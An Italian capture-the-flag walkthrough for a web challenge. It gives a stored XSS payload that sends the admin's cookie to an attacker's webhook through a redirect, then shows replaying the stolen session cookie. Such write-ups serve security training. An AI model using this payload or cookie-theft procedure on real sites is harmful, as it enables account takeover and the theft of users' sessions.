
1) Creare un account e loggarsi
2) Copiare l'URL della vostra pagina (http://curious-george.challs.olicyber.it?id=your-id
3) Cliccare su edit profile
4) Inserire il seguente payload (prendere l'URL da webhook.site, attenzione ad inserire l'URL giusto e non quello con dentro #!)
<script>
window.location.href = "http://yourwebhook.site/?cookie=" + document.cookie
</script>
Questo payload ci permette di redirectare l'admin al nostro webhook, inserendo il suo cookie in un query parameter
5) Cliccare su "update"
6) Andare su http://curious-george.challs.olicyber.it/bug.php
7) Inserire l'URL della vostra pagina
8) Eseguire il file pow-modified.py e incollare sulla pagina /bug.php ciò che printa lo script python
9) Clicca submit
10) Sul webhook troveremo una richiesta simile:
http://webhook.site/3c132b32-cbda91f-bc329af-9f82c22?cookie=PHPSESSID=fshaonidmsaoceuwyqeiwq
11) Prendere quel cookie e inserirlo al posto del cookie corrente (si può sostituire sia da webhook, sia dai DevTools)
12) Visitare http://curious-george.challs.olicyber.it/index.php